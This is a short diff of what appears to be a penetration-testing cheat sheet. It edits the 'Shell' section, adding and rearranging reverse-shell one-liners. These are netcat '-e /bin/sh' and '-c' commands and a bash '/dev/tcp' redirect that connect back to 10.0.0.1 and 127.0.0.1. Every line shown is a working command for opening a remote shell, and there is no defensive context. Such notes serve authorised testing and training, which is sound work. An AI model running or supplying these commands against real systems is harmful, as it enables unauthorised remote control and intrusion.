@@ -5,11 +5,17 @@
 ### Shell
 
 ```
+nc -e /bin/sh 10.0.0.1 1234
+```
+
+When `-c` works:
+```
 nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
 ```
 
+With `/dev/tcp`
 ```
-nc -e /bin/sh 10.0.0.1 1234
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 Using FIFO (Doesn't work with upgrading?)
